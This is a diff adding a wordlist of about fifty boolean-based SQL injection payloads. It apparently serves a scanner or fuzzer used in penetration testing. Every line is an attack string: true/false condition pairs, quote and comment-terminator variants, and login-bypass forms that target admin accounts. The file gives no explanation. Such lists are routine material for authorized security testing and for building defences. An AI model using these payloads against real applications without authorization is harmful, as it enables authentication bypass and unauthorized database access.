@@ -1,0 +1,53 @@
+# Boolean-Based SQL Injection Payloads
+' OR '1'='1
+' OR '1'='2
+' AND '1'='1
+' AND '1'='2
+' OR 1=1
+' OR 1=2
+' AND 1=1
+' AND 1=2
+1' OR '1'='1
+1' OR '1'='2
+1' AND '1'='1
+1' AND '1'='2
+admin' OR '1'='1
+admin' OR '1'='2
+' OR 'a'='a
+' OR 'a'='b
+' AND 'a'='a
+' AND 'a'='b
+' OR 1=1--
+' OR 1=2--
+' AND 1=1--
+' AND 1=2--
+' OR '1'='1'--
+' OR '1'='2'--
+') OR ('1'='1
+') OR ('1'='2
+') AND ('1'='1
+') AND ('1'='2
+" OR "1"="1
+" OR "1"="2
+" AND "1"="1
+" AND "1"="2
+' OR '1'='1' /*
+' OR '1'='2' /*
+' AND '1'='1' /*
+' AND '1'='2' /*
+' OR 1=1#
+' OR 1=2#
+' AND 1=1#
+' AND 1=2#
+1 OR 1=1
+1 OR 1=2
+1 AND 1=1
+1 AND 1=2
+1' OR '1'='1' OR '1'='1
+1' OR '1'='2' OR '1'='1
+' OR username='admin' OR '1'='1
+' OR username='admin' OR '1'='2
+' OR user='admin' OR '1'='1
+' OR email='admin@example.com' OR '1'='1
+' OR id=1 OR '1'='1
+' OR name LIKE '%admin%' OR '1'='1
